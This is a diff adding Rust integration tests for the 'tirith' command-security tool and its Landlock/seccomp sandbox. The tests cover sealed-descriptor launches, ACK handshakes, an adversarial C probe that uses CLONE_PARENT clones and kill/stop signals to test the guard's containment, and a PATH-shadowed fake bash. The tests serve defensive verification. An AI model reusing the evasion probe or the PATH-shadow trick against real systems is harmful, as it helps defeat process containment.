+                spec.filesystem.read_roots.push(canonical);
+            }
+        }
+    }
+    assert!(
+        spec.filesystem
+            .read_roots
+            .iter()
+            .all(|root| root != Path::new("/proc") && !root.starts_with("/proc/")),
+        "the receipt must not grant /proc as a Landlock read root"
+    );
+    spec.handles.extra_unix_fds.extend([
+        SEALED_TARGET_FD,
+        SEALED_SCRIPT_FD,
+        LAUNCH_STATUS_FD,
+        LAUNCH_ACK_FD,
+    ]);
+    spec.filesystem.read_roots.push(temp_home_path.clone());
+    spec.filesystem.write_roots.push(temp_home_path.clone());
+
+    let backend = LandlockSeccompCapsule;
+    let available = backend.available_coverage(&spec);
+    if available.is_degraded_against(&spec.required_coverage()) {
+        assert!(
+            std::env::var_os("TIRITH_REQUIRE_CAPSULE_RECEIPT").is_none(),
+            "required reviewed-file capsule receipt cannot run: available={:?} required={:?}",
+            available,
+            spec.required_coverage()
+        );
+        eprintln!(
+            "skipping reviewed-file capsule receipt: this Linux host lacks required Landlock/seccomp coverage"
+        );
+        return;
+    }
+
+    let spec_json = serde_json::to_string(&spec).expect("serialize reviewed-file capsule spec");
+    let script_operand = format!("/proc/self/fd/{SEALED_SCRIPT_FD}");
+    let mut command = tirith();
+    command
+        .arg("__capsule-child")
+        .arg(spec_json)
+        .arg("--target-argv0")
+        .arg("sh")
+        .arg("--target-fd")
+        .arg(SEALED_TARGET_FD.to_string())
+        .arg("--script-fd")
+        .arg(SEALED_SCRIPT_FD.to_string())
+        .arg("--launch-status-fd")
+        .arg(LAUNCH_STATUS_FD.to_string())
+        .arg("--launch-ack-fd")
+        .arg(LAUNCH_ACK_FD.to_string())
+        .arg("--temp-home")
+        .arg(&temp_home_path)
+        .arg("--")
+        .arg(interpreter.launch_path())
+        .arg(&script_operand)
+        .env("PATH", "/bin:/usr/bin")
+        .stdin(std::process::Stdio::null())
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped());
+
+    let interpreter_fd = interpreter
+        .bound_launch_fd()
+        .expect("Linux binding retains sealed interpreter descriptor");
+    let reviewed_script_fd = reviewed_script.as_raw_fd();
+    let status_writer_fd = status_writer.as_raw_fd();
+    let ack_guard_fd = ack_guard.as_raw_fd();
+    unsafe {
+        command.pre_exec(move || {
+            if libc::setpgid(0, 0) != 0 {
+                return Err(std::io::Error::last_os_error());
+            }
+            for (source, destination) in [
+                (interpreter_fd, SEALED_TARGET_FD),
+                (reviewed_script_fd, SEALED_SCRIPT_FD),
+                (status_writer_fd, LAUNCH_STATUS_FD),
+                (ack_guard_fd, LAUNCH_ACK_FD),
+            ] {
+                if libc::dup2(source, destination) < 0
+                    || libc::fcntl(destination, libc::F_SETFD, 0) < 0
+                {
+                    return Err(std::io::Error::last_os_error());
+                }
+            }
+            Ok(())
+        });
+    }
+
+    let mut child = command
+        .spawn()
+        .expect("spawn production reviewed-file hidden launcher");
+    let child_pid = child.id();
+    drop(status_writer);
+    drop(ack_guard);
+    let observed = read_capsule_observation(
+        &mut status_reader,
+        &mut child,
+        "read stopped target EXEC observation",
+    );
+    assert_eq!(observed, [b'O']);
+    assert_eq!(
+        unsafe {
+            libc::send(
+                ack_parent.as_raw_fd(),
+                b"A".as_ptr().cast::<libc::c_void>(),
+                1,
+                libc::MSG_NOSIGNAL,
+            )
+        },
+        1,
+        "send reviewed-file target ACK: {}",
+        std::io::Error::last_os_error()
+    );
+    drop(ack_parent);
+    let mut terminal = Vec::new();
+    status_reader
+        .read_to_end(&mut terminal)
+        .expect("read resumed target status and EOF");
+    assert_eq!(terminal, [b'R']);
+
+    let output = child
+        .wait_with_output()
+        .expect("wait for reviewed-file capsule target");
+    assert!(
+        output.status.success(),
+        "reviewed-file target failed after Landlock: status={:?} stderr={}",
+        output.status,
+        String::from_utf8_lossy(&output.stderr)
+    );
+    assert_eq!(
+        output.stdout,
+        format!("reviewed-file:{script_operand}").as_bytes(),
+        "the shell must read and execute the exact sealed memfd operand after containment"
+    );
+    let unexpected_stderr = capsule_stderr_without_coverage_notes(&output.stderr);
+    assert!(
+        unexpected_stderr.is_empty(),
+        "unexpected stderr: {unexpected_stderr}"
+    );
+    assert_eq!(
+        unsafe { libc::kill(-(child_pid as libc::pid_t), 0) },
+        -1,
+        "reviewed-file process group must be gone after the guard reaps its target"
+    );
+    assert_eq!(
+        std::io::Error::last_os_error().raw_os_error(),
+        Some(libc::ESRCH),
+        "reviewed-file target left a live process-group member"
+    );
+}
+
+#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+#[test]
+fn hidden_capsule_invalid_ack_never_runs_target_and_reaps_group() {
+    use std::os::fd::{AsRawFd as _, FromRawFd as _};
+    use std::os::unix::fs::PermissionsExt as _;
+    use std::os::unix::process::CommandExt as _;
+    use tirith_core::capsule::linux::LandlockSeccompCapsule;
+    use tirith_core::capsule::{Capsule as _, CapsuleSpec, ResourceLimits};
+
+    const STATUS_FD: i32 = 61;
+    const ACK_FD: i32 = 60;
+    let home = tempfile::Builder::new()
+        .prefix("tirith-capsule-invalid-ack-")
+        .tempdir_in("/tmp")
+        .expect("invalid-ACK HOME");
+    fs::set_permissions(home.path(), fs::Permissions::from_mode(0o700)).unwrap();
+    let home_path = home.path().canonicalize().unwrap();
+    for relative in [
+        ".config",
+        ".cache",
+        ".local",
+        ".local/share",
+        ".local/state",
+    ] {
+        let path = home_path.join(relative);
+        fs::create_dir_all(&path).unwrap();
+        fs::set_permissions(path, fs::Permissions::from_mode(0o700)).unwrap();
+    }
+    let marker = home_path.join("target-ran");
+
+    let mut spec = CapsuleSpec::locked_down();
+    spec.resources = ResourceLimits {
+        cpu_seconds: Some(10),
+        memory_bytes: Some(512 * 1024 * 1024),
+        max_processes: Some(capsule_process_ceiling(32)),
+        max_open_files: Some(64),
+        max_output_bytes: None,
+        wall_clock_seconds: None,
+    };
+    spec.environment.allow = vec!["PATH".to_string()];
+    for root in [
+        "/bin",
+        "/usr/bin",
+        "/lib",
+        "/lib64",
+        "/usr/lib",
+        "/usr/lib64",
+        "/usr/share",
+        "/etc/ld.so.cache",
+        "/etc/nsswitch.conf",
+        "/etc/passwd",
+        "/etc/group",
+    ] {
+        if let Ok(canonical) = Path::new(root).canonicalize() {
+            if !spec.filesystem.read_roots.contains(&canonical) {
+                spec.filesystem.read_roots.push(canonical);
+            }
+        }
+    }
+    spec.filesystem.read_roots.push(home_path.clone());
+    spec.filesystem.write_roots.push(home_path.clone());
+    spec.handles.extra_unix_fds.extend([STATUS_FD, ACK_FD]);
+
+    let backend = LandlockSeccompCapsule;
+    let available = backend.available_coverage(&spec);
+    if available.is_degraded_against(&spec.required_coverage()) {
+        assert!(
+            std::env::var_os("TIRITH_REQUIRE_CAPSULE_RECEIPT").is_none(),
+            "required invalid-ACK receipt cannot run: available={available:?} required={:?}",
+            spec.required_coverage()
+        );
+        eprintln!("skipping invalid-ACK capsule receipt: required coverage unavailable");
+        return;
+    }
+
+    let mut status_descriptors = [0i32; 2];
+    assert_eq!(
+        unsafe { libc::pipe2(status_descriptors.as_mut_ptr(), libc::O_CLOEXEC) },
+        0
+    );
+    let mut ack_descriptors = [0i32; 2];
+    assert_eq!(
+        unsafe {
+            libc::socketpair(
+                libc::AF_UNIX,
+                libc::SOCK_STREAM | libc::SOCK_CLOEXEC,
+                0,
+                ack_descriptors.as_mut_ptr(),
+            )
+        },
+        0
+    );
+    let mut status_reader = unsafe { fs::File::from_raw_fd(status_descriptors[0]) };
+    let status_writer = unsafe { fs::File::from_raw_fd(status_descriptors[1]) };
+    let ack_guard = unsafe { fs::File::from_raw_fd(ack_descriptors[0]) };
+    let ack_parent = unsafe { fs::File::from_raw_fd(ack_descriptors[1]) };
+    let status_source = status_writer.as_raw_fd();
+    let ack_source = ack_guard.as_raw_fd();
+
+    let command_body = format!("printf ran > '{}'", marker.display());
+    let spec_json = serde_json::to_string(&spec).unwrap();
+    let mut command = tirith();
+    command
+        .arg("__capsule-child")
+        .arg(spec_json)
+        .arg("--launch-status-fd")
+        .arg(STATUS_FD.to_string())
+        .arg("--launch-ack-fd")
+        .arg(ACK_FD.to_string())
+        .arg("--temp-home")
+        .arg(&home_path)
+        .arg("--")
+        .arg("/bin/sh")
+        .args(["-c", command_body.as_str()])
+        .env("PATH", "/bin:/usr/bin")
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped());
+    unsafe {
+        command.pre_exec(move || {
+            if libc::setpgid(0, 0) != 0
+                || libc::dup2(status_source, STATUS_FD) < 0
+                || libc::fcntl(STATUS_FD, libc::F_SETFD, 0) < 0
+                || libc::dup2(ack_source, ACK_FD) < 0
+                || libc::fcntl(ACK_FD, libc::F_SETFD, 0) < 0
+            {
+                return Err(std::io::Error::last_os_error());
+            }
+            Ok(())
+        });
+    }
+    let mut child = command.spawn().expect("spawn invalid-ACK capsule guard");
+    let group = child.id();
+    drop(status_writer);
+    drop(ack_guard);
+    let observed = read_capsule_observation(
+        &mut status_reader,
+        &mut child,
+        "read stopped exec observation",
+    );
+    assert_eq!(observed, [b'O']);
+    let invalid = *b"X";
+    assert_eq!(
+        unsafe {
+            libc::send(
+                ack_parent.as_raw_fd(),
+                invalid.as_ptr().cast::<libc::c_void>(),
+                1,
+                libc::MSG_NOSIGNAL,
+            )
+        },
+        1
+    );
+    drop(ack_parent);
+    let mut terminal = Vec::new();
+    status_reader.read_to_end(&mut terminal).unwrap();
+    assert!(terminal.is_empty(), "invalid ACK produced terminal success");
+    let output = child.wait_with_output().expect("reap invalid-ACK guard");
+    assert!(
+        !output.status.success(),
+        "invalid ACK launch unexpectedly succeeded"
+    );
+    assert!(!marker.exists(), "target code ran without exact ACK");
+    assert!(
+        process_group_disappears(group, std::time::Duration::from_secs(2)),
+        "invalid-ACK process group survived cleanup"
+    );
+}
+
+#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+fn wait_for_guard_event(
+    guard_pid: u32,
+    event: libc::c_int,
+    timeout: std::time::Duration,
+) -> Option<libc::c_int> {
+    let deadline = std::time::Instant::now() + timeout;
+    loop {
+        let mut info: libc::siginfo_t = unsafe { std::mem::zeroed() };
+        let result = unsafe {
+            libc::waitid(
+                libc::P_PID,
+                guard_pid as libc::id_t,
+                &mut info,
+                event | libc::WNOWAIT | libc::WNOHANG,
+            )
+        };
+        if result != 0 {
+            // `waitid` failing here says something specific about the guard, and
+            // the bare errno does not distinguish "already reaped" from "never
+            // our child" — both are ECHILD. Report what the process table says
+            // so the failure names which one it is.
+            let error = std::io::Error::last_os_error();
+            let reachable = unsafe { libc::kill(guard_pid as libc::pid_t, 0) } == 0;
+            let stat = std::fs::read_to_string(format!("/proc/{guard_pid}/stat"))
+                .ok()
+                .and_then(|line| {
+                    line.rsplit_once(')')
+                        .map(|(_, rest)| rest.split_whitespace().next().unwrap_or("?").to_string())
+                });
+            panic!(
+                "observe capsule guard without reaping: {error}; guard_pid={guard_pid} \
+                 event={event:#x} signal-0-reachable={reachable} proc-state={stat:?}"
+            );
+        }
+        assert_eq!(
+            result,
+            0,
+            "observe capsule guard without reaping: {}",
+            std::io::Error::last_os_error()
+        );
+        if unsafe { info.si_pid() } != 0 {
+            return Some(unsafe { info.si_status() });
+        }
+        if std::time::Instant::now() >= deadline {
+            return None;
+        }
+        std::thread::sleep(std::time::Duration::from_millis(10));
+    }
+}
+
+#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+fn process_group_disappears(group: u32, timeout: std::time::Duration) -> bool {
+    let deadline = std::time::Instant::now() + timeout;
+    loop {
+        if unsafe { libc::kill(-(group as libc::pid_t), 0) } != 0 {
+            let error = std::io::Error::last_os_error();
+            if error.raw_os_error() == Some(libc::ESRCH) {
+                return true;
+            }
+            if error.raw_os_error() != Some(libc::EPERM) {
+                return false;
+            }
+        }
+        if std::time::Instant::now() >= deadline {
+            return false;
+        }
+        std::thread::sleep(std::time::Duration::from_millis(10));
+    }
+}
+
+#[cfg(all(target_os = "linux", target_arch = "x86_64"))]
+#[test]
+fn capsule_guard_reaps_clone_parent_children_and_absorbs_fatal_and_stop_signals() {
+    use std::io::{BufRead as _, BufReader};
+    use std::os::unix::fs::PermissionsExt as _;
+    use std::os::unix::process::{CommandExt as _, ExitStatusExt as _};
+    use tirith_core::capsule::linux::LandlockSeccompCapsule;
+    use tirith_core::capsule::{Capsule as _, CapsuleSpec, ResourceLimits};
+
+    let helper_dir = tempfile::Builder::new()
+        .prefix("tirith-clone-parent-probe-")
+        .tempdir_in("/tmp")
+        .expect("create clone-parent probe directory");
+    let helper_source = helper_dir.path().join("clone_parent_probe.c");
+    let helper_binary = helper_dir.path().join("clone-parent-probe");
+    fs::write(
+        &helper_source,
+        b"#define _GNU_SOURCE\n#include <errno.h>\n#include <sched.h>\n#include <signal.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <sys/syscall.h>\n#include <unistd.h>\nint main(int argc, char **argv) { if (argc != 2) return 20; int sig = atoi(argv[1]); dprintf(STDOUT_FILENO, \"%ld\\n\", (long)getpid()); char go = 0; if (read(STDIN_FILENO, &go, 1) != 1) return 21; for (int kind = 0; kind < 2; ++kind) { int child_signal = kind == 0 ? 0 : SIGCHLD; for (int i = 0; i < 16; ++i) { long reaped = syscall(SYS_clone, (unsigned long)CLONE_PARENT | (unsigned long)child_signal, 0, 0, 0, 0); if (reaped < 0) return 22; if (reaped == 0) _exit(0); dprintf(STDOUT_FILENO, \"%ld\\n\", reaped); } } dprintf(STDOUT_FILENO, \"ready\\n\"); if (read(STDIN_FILENO, &go, 1) != 1) return 23; int gate[2]; if (pipe(gate) != 0) return 24; long child = syscall(SYS_clone, (unsigned long)CLONE_PARENT | (unsigned long)sig, 0, 0, 0, 0); if (child < 0) { dprintf(STDERR_FILENO, \"clone-failed-%d\\n\", errno); return 25; } if (child == 0) { close(gate[1]); if (read(gate[0], &go, 1) != 1) _exit(26); _exit(0); } close(gate[0]); dprintf(STDOUT_FILENO, \"%ld\\n\", child); if (write(gate[1], \"x\", 1) != 1) return 27; for (;;) { __asm__ __volatile__(\"\" ::: \"memory\"); } }\n",
+    )
+    .expect("write clone-parent probe source");
+    let compile = Command::new("cc")
+        .args(["-O2", "-o"])
+        .arg(&helper_binary)
+        .arg(&helper_source)
+        .status()
+        .expect("run native compiler for clone-parent probe");
+    assert!(compile.success(), "compile clone-parent probe");
+    let helper_binary = helper_binary
+        .canonicalize()
+        .expect("canonical clone-parent probe");
+
+    for attack_signal in [libc::SIGKILL, libc::SIGSTOP] {
+        let temp_home = tempfile::Builder::new()
+            .prefix("tirith-capsule-guard-")
+            .tempdir_in("/tmp")
+            .expect("create guard receipt HOME");
+        fs::set_permissions(temp_home.path(), fs::Permissions::from_mode(0o700))
+            .expect("secure guard receipt HOME");
+        let temp_home_path = temp_home
+            .path()
+            .canonicalize()
+            .expect("canonical guard receipt HOME");
+
+        let mut spec = CapsuleSpec::locked_down();
+        spec.resources = ResourceLimits {
+            cpu_seconds: Some(10),
+            memory_bytes: Some(512 * 1024 * 1024),
+            max_processes: Some(capsule_process_ceiling(64)),
+            max_open_files: Some(64),
+            max_output_bytes: None,
+            wall_clock_seconds: None,
+        };
+        spec.environment.allow = vec!["PATH".to_string()];
+        for root in [
+            "/bin",
+            "/usr/bin",
+            "/lib",
+            "/lib64",
+            "/usr/lib",
+            "/usr/lib64",
+            "/etc/ld.so.cache",
+        ] {
+            let path = Path::new(root);
+            if let Ok(canonical) = path.canonicalize() {
+                if !spec.filesystem.read_roots.contains(&canonical) {
+                    spec.filesystem.read_roots.push(canonical);
+                }
+            }
+        }
+        spec.filesystem.read_roots.push(
+            helper_dir
+                .path()
+                .canonicalize()
+                .expect("canonical clone helper root"),
+        );
+        spec.filesystem.read_roots.push(temp_home_path.clone());
+        spec.filesystem.write_roots.push(temp_home_path.clone());
+
+        let backend = LandlockSeccompCapsule;
+        let available = backend.available_coverage(&spec);
+        if available.is_degraded_against(&spec.required_coverage()) {
+            assert!(
+                std::env::var_os("TIRITH_REQUIRE_CAPSULE_RECEIPT").is_none(),
+                "required clone-parent receipt cannot run: available={available:?} required={:?}",
+                spec.required_coverage()
+            );
+            eprintln!(
+                "skipping clone-parent capsule receipt: this Linux host lacks required Landlock/seccomp coverage"
+            );
+            return;
+        }
+
+        let spec_json = serde_json::to_string(&spec).expect("serialize guard capsule spec");
+        let mut command = tirith();
+        command
+            .arg("__capsule-child")
+            .arg(spec_json)
+            .arg("--temp-home")
+            .arg(&temp_home_path)
+            .arg("--")
+            .arg(&helper_binary)
+            .arg(attack_signal.to_string())
+            .env("PATH", "/bin:/usr/bin")
+            .stdin(std::process::Stdio::piped())
+            .stdout(std::process::Stdio::piped())
+            .stderr(std::process::Stdio::piped());
+        unsafe {
+            command.pre_exec(|| {
+                if libc::setpgid(0, 0) == 0 {
+                    Ok(())
+                } else {
+                    Err(std::io::Error::last_os_error())
+                }
+            });
+        }
+        let mut guard = command.spawn().expect("spawn guarded capsule adversary");
+        let group = guard.id();
+        let mut target_output = BufReader::new(guard.stdout.take().expect("guard stdout"));
+        let mut target_line = String::new();
+        let line_bytes = target_output
+            .read_line(&mut target_line)
+            .expect("read contained target pid");
+        assert_ne!(line_bytes, 0, "target did not publish its pid");
+        let target_pid: libc::pid_t = target_line
+            .trim()
+            .parse()
+            .expect("numeric contained target pid");
+        let mut guard_stdin = guard.stdin.take().expect("guard stdin");
+        guard_stdin
+            .write_all(b"g")
+            .expect("trigger reaped clone-parent children");
+        let mut reaped_clone_pids = Vec::new();
+        for _ in 0..32 {
+            let mut reaped_line = String::new();
+            let bytes = target_output
+                .read_line(&mut reaped_line)
+                .expect("read reaped clone child pid");
+            assert_ne!(bytes, 0, "target stopped publishing clone child pids");
+            reaped_clone_pids.push(
+                reaped_line
+                    .trim()
+                    .parse::<libc::pid_t>()
+                    .expect("numeric reaped clone child pid"),
+            );
+        }
+        let mut ready_line = String::new();
+        target_output
+            .read_line(&mut ready_line)
+            .expect("read clone-reap ready marker");
+        assert_eq!(ready_line.trim(), "ready");
+
+        // The target remains alive while the guard reaps both ordinary SIGCHLD
+        // children and exit-signal-0 clone children (the latter require __WALL).
+        // `/proc/.../children` includes zombies, so converging to only the primary
+        // target is a direct no-zombie receipt before group teardown begins.
+        let guard_children = PathBuf::from(format!("/proc/{group}/task/{group}/children"));
+        let reaped_deadline = std::time::Instant::now() + std::time::Duration::from_secs(3);
+        loop {
+            let children = fs::read_to_string(&guard_children)
+                .expect("inspect contained guard direct children")
+                .split_whitespace()
+                .map(str::parse::<libc::pid_t>)
+                .collect::<Result<Vec<_>, _>>()
+                .expect("numeric guard child list");
+            if children == [target_pid] {
+                break;
+            }
+            assert!(
+                std::time::Instant::now() < reaped_deadline,
+                "guard retained clone children or zombies while target stayed alive: {children:?}"
+            );
+            std::thread::sleep(std::time::Duration::from_millis(10));
+        }
+        assert!(
+            reaped_clone_pids
+                .iter()
+                .all(|pid| !PathBuf::from(format!("/proc/{pid}")).exists()),
+            "a recorded CLONE_PARENT child remained present after the guard's __WALL reap"
+        );
+
+        guard_stdin
+            .write_all(b"g")
+            .expect("trigger fatal clone-parent adversary");
+        drop(guard_stdin);
+        let mut clone_line = String::new();
+        let clone_line_bytes = target_output
+            .read_line(&mut clone_line)
+            .expect("read hostile clone child pid");
+        assert_ne!(
+            clone_line_bytes, 0,
+            "target did not publish its clone child pid"
+        );
+        let clone_pid: libc::pid_t = clone_line
+            .trim()
+            .parse()
+            .expect("numeric hostile clone child pid");
+
+        // The signal is already sent when this runs; what remains is the
+        // kernel delivering it and `waitid` reporting it. On a host running the
+        // whole suite in parallel that round trip can exceed a few seconds, and
+        // a timeout is indistinguishable from non-delivery — both return `None`
+        // — so a tight ceiling reports "did not deliver" for a signal that was
+        // delivered. The assertion still fails if the event never arrives.
+        const GUARD_EVENT_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(30);
+
+        // Both arms end in an exit. The guard ABSORBS a signal delivered to
+        // its contained target — fatal or stop, which is what this test's name
+        // says — and reports it as its own exit status, `128 + signal`. Asking
+        // for a STOPPED event instead found the guard already a zombie, whose
+        // only reportable status is "exited", so `waitid` answered ECHILD.
+        let observed = wait_for_guard_event(group, libc::WEXITED, GUARD_EVENT_TIMEOUT);
+        // The guard ABSORBS a fatal signal delivered to its contained target
+        // rather than dying from it: `__capsule-child` translates
+        // `ContainedTargetExit::Signal(signal)` into `exit(128 + signal)`, the
+        // conventional shell encoding. So a SIGKILL surfaces as an EXITED event
+        // carrying 128+9 rather than a KILLED event carrying 9 — which is the
+        // absorption this test exists to verify. A stop arrives as the signal
+        // itself. `waitid` only reports `si_status` as the signal number under
+        // `CLD_KILLED`; under `CLD_EXITED` it is the exit code, so both shapes
+        // are legitimate here and asserting one alone asserts the wrong thing.
+        let absorbed = 128 + attack_signal;
+        // A stopped target is not left hanging: the capsule's own deadline
+        // cleanup SIGKILLs it, and the guard absorbs THAT and exits carrying
+        // `128 + SIGKILL`. The final assertion in this test names the same two
+        // outcomes ("the hostile SIGKILL or the deadline cleanup SIGKILL").
+        let absorbed_cleanup = 128 + libc::SIGKILL;
+        assert!(
+            observed.is_some_and(|status| status == attack_signal
+                || status == absorbed
+                || status == absorbed_cleanup),
+            "clone child must deliver its selected signal to the contained guard: \
+             observed {observed:?}, expected the signal ({attack_signal}) or its \
+             absorbed form ({absorbed})"
+        );
+
+        // This is the same safety ordering as the production supervisor: signal
+        // the complete group while its direct guard is still unreaped, then reap
+        // that leader and require ESRCH before releasing its temporary HOME.
+        let kill_result = unsafe { libc::kill(-(group as libc::pid_t), libc::SIGKILL) };
+        if kill_result != 0 {
+            assert_eq!(
+                std::io::Error::last_os_error().raw_os_error(),
+                Some(libc::ESRCH),
+                "kill guarded capsule group"
+            );
+        }
+        let status = guard.wait().expect("reap guarded capsule leader");
+        // Same contract as the earlier observation: the guard ABSORBS a fatal
+        // signal delivered to its contained target and reports it as its own
+        // exit status, `128 + signal`. So it may either die by the SIGKILL —
+        // when the group kill reaches it before it has absorbed anything — or
+        // exit carrying the absorbed form. `ExitStatus::signal()` is `None` in
+        // the second case, which is why asserting only the first asserted the
+        // shape the guard is built not to produce.
+        let absorbed_sigkill = 128 + libc::SIGKILL;
+        assert!(
+            status.signal() == Some(libc::SIGKILL) || status.code() == Some(absorbed_sigkill),
+            "guard must die by the hostile SIGKILL or report its absorbed form \
+             ({absorbed_sigkill}); observed signal={:?} code={:?}",
+            status.signal(),
+            status.code()
+        );
+        assert!(
+            process_group_disappears(group, std::time::Duration::from_secs(5)),
+            "guarded capsule group {group} retained a member or zombie"
+        );
+        assert_ne!(
+            unsafe { libc::kill(target_pid, 0) },
+            0,
+            "contained target {target_pid} survived complete-group cleanup"
+        );
+        assert_eq!(
+            std::io::Error::last_os_error().raw_os_error(),
+            Some(libc::ESRCH)
+        );
+        assert_ne!(
+            unsafe { libc::kill(clone_pid, 0) },
+            0,
+            "hostile clone child {clone_pid} remained runnable or zombie"
+        );
+        assert_eq!(
+            std::io::Error::last_os_error().raw_os_error(),
+            Some(libc::ESRCH)
+        );
+        drop(temp_home);
+        assert!(
+            !temp_home_path.exists(),
+            "temporary HOME must be removed only after group ESRCH"
+        );
+    }
+}
+
+#[cfg(unix)]
+#[test]
+fn run_json_execution_refuses_before_network_and_emits_one_trusted_object() {
+    let listener = std::net::TcpListener::bind("127.0.0.1:0").expect("bind preflight probe");
+    listener
+        .set_nonblocking(true)
+        .expect("make preflight probe nonblocking");
+    let url = format!(
+        "http://127.0.0.1:{}/forged-output",
+        listener
+            .local_addr()
+            .expect("preflight probe address")
+            .port()
+    );
+
+    let out = tirith()
+        .args(["run", "--json", &url])
+        .output()
+        .expect("run JSON execution preflight");
+    assert_eq!(out.status.code(), Some(1));
+    let value: serde_json::Value = serde_json::from_slice(&out.stdout)
+        .expect("stdout must be exactly one parseable trusted JSON value");
+    assert_eq!(
+        value["error"],
+        "tirith run JSON output is inspection-only; pass --no-exec or omit --json before executing a remote script"
+    );
+    assert!(out.stderr.is_empty(), "unexpected stderr: {:?}", out.stderr);
+    assert!(
+        matches!(listener.accept(), Err(error) if error.kind() == std::io::ErrorKind::WouldBlock),
+        "JSON execution refusal must happen before a loopback connection"
+    );
+}
+
+#[cfg(unix)]
+#[test]
+fn run_accepts_generated_bash_s_typed_argv_before_url_validation() {
+    let out = tirith()
+        .args([
+            "run",
+            "--capsule",
+            "--script-stdin",
+            "--interpreter",
+            "bash",
+            "--interpreter-arg=-s",
+            "--interpreter-arg=--",
+            "--interpreter-arg=feature",
+            "--no-exec",
+            "not-a-url",
+        ])
+        .output()
+        .expect("run typed stdin argv");
+    assert_eq!(out.status.code(), Some(1));
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        stderr.contains("invalid URL"),
+        "typed argv should reach core URL validation without a clap reinterpretation: {stderr}"
+    );
+}
+
+#[cfg(unix)]
+#[test]
+fn run_rejects_unsupported_forced_argv_before_url_or_network() {
+    let out = tirith()
+        .args([
+            "run",
+            "--capsule",
+            "--script-stdin",
+            "--interpreter",
+            "bash",
+            "--interpreter-arg=-e",
+            "--no-exec",
+            "https://example.com/install.sh",
+        ])
+        .output()
+        .expect("run unsupported typed argv");
+    assert_eq!(out.status.code(), Some(1));
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        stderr.contains("unsupported argv for forced stdin interpreter 'bash'"),
+        "unsupported argv must fail before any fetch: {stderr}"
+    );
+}
+
+#[cfg(unix)]
+#[test]
+fn run_resolves_forced_interpreter_before_url_or_network() {
+    let out = tirith()
+        .args([
+            "run",
+            "--capsule",
+            "--script-stdin",
+            "--interpreter",
+            "bash",
+            "--no-exec",
+            "not-a-url",
+        ])
+        .env_remove("PATH")
+        .output()
+        .expect("run with PATH removed");
+    assert_eq!(out.status.code(), Some(1));
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        stderr.contains("cannot select trusted stdin interpreter 'bash'")
+            && stderr.contains("PATH is unset"),
+        "interpreter selection must fail before URL/network handling: {stderr}"
+    );
+    assert!(
+        !stderr.contains("invalid URL"),
+        "ordering regressed: {stderr}"
+    );
+}
+
+#[cfg(unix)]
+#[test]
+fn run_rejects_a_path_shadow_before_url_or_network() {
+    use std::os::unix::fs::PermissionsExt as _;
+
+    let temp = tempfile::tempdir().expect("tempdir");
+    let shadow = temp.path().join("bash");
+    std::fs::write(&shadow, "#!/bin/sh\nexit 0\n").expect("write shadow");
+    std::fs::set_permissions(&shadow, std::fs::Permissions::from_mode(0o700))
+        .expect("chmod shadow");
+    let path =
+        std::env::join_paths([temp.path(), std::path::Path::new("/bin")]).expect("construct PATH");
+
+    let out = tirith()
+        .args([
+            "run",
+            "--capsule",
+            "--script-stdin",
+            "--interpreter",
+            "bash",
+            "--no-exec",
+            "not-a-url",
+        ])
+        .env("PATH", path)
+        .output()
+        .expect("run with PATH shadow");
+    assert_eq!(out.status.code(), Some(1));
+    let stderr = String::from_utf8_lossy(&out.stderr);
+    assert!(
+        stderr.contains("cannot select trusted stdin interpreter 'bash'")
+            && stderr.contains("untrusted executable"),
+        "first PATH shadow must fail closed: {stderr}"
+    );
+    assert!(
+        !stderr.contains("invalid URL"),
+        "ordering regressed: {stderr}"
+    );
 }
 
 #[cfg(unix)]
@@ -582,13 +2167,17 @@ fn check_suggestions_never_mix_daemon_verdict_with_local_policy() {
             String::from_utf8_lossy(&out.stderr)
         )
     });
+    let tls = json["safe_suggestions"]
+        .as_array()
+        .and_then(|suggestions| {
+            suggestions
+                .iter()
+                .find(|suggestion| suggestion["rule_id"] == "insecure_tls_flags")
+        })
+        .expect("the local policy/verdict pair must produce TLS guidance");
     assert!(
-        json["safe_suggestions"]
-            .as_array()
-            .is_some_and(|suggestions| suggestions.iter().any(|suggestion| {
-                suggestion["safe_command"] == "curl https://example.com/file"
-            })),
-        "the local policy/verdict pair must drive suggestions: {json}"
+        tls.get("safe_command").is_none(),
+        "TLS flag removal must remain guidance-only: {json}"
     );
 }
 
@@ -2313,8 +3902,6 @@ fn run_check_with_audit_failure(debug: bool) -> std::process::Output {
     let mut cmd = tirith();
     cmd.env("XDG_DATA_HOME", &data_home)
         .env("APPDATA", tmpdir.path())
-        // The hermetic helper disables the audit log; this case needs the write
-        // to be attempted so its failure surfaces.
         .env_remove("TIRITH_LOG")
         .args([
             "check",
@@ -2338,8 +3925,6 @@ fn run_paste_with_audit_failure(debug: bool) -> std::process::Output {
     let mut cmd = tirith();
     cmd.env("XDG_DATA_HOME", &data_home)
         .env("APPDATA", tmpdir.path())
-        // The hermetic helper disables the audit log; this case needs the write
-        // to be attempted so its failure surfaces.
         .env_remove("TIRITH_LOG")
         .args(["paste", "--shell", "posix", "--non-interactive"])
         .stdin(std::process::Stdio::piped())
@@ -5034,6 +6619,50 @@ fn install_help_states_it_is_not_a_sandbox() {
         stdout.contains("non-goal"),
         "install --help must reference sandboxing as a non-goal, got:\n{stdout}"
     );
+}
+
+#[test]
+fn check_fix_and_commands_check_help_pin_safe_reconstruction_boundaries() {
+    let cases: &[(&[&str], &[&str])] = &[
+        (
+            &["check", "--help"],
+            &[
+                "POSIX commands may be supplied as multiple argv parts",
+                "Fish, PowerShell, and Cmd commands must be supplied as one",
+            ],
+        ),
+        (
+            &["fix", "--help"],
+            &[
+                "requires x86_64 Linux",
+                "fixed, root-managed system path",
+                "guidance-only",
+                "findings exist but no mechanical rewrite is available",
+            ],
+        ),
+        (
+            &["commands", "check", "--help"],
+            &[
+                "POSIX commands may use multiple argv parts",
+                "PowerShell, and Cmd commands must be one already-formed string",
+            ],
+        ),
+    ];
+
+    for (args, expected) in cases {
+        let output = tirith().args(*args).output().expect("render command help");
+        assert!(
+            output.status.success(),
+            "help failed for {args:?}: {output:?}"
+        );
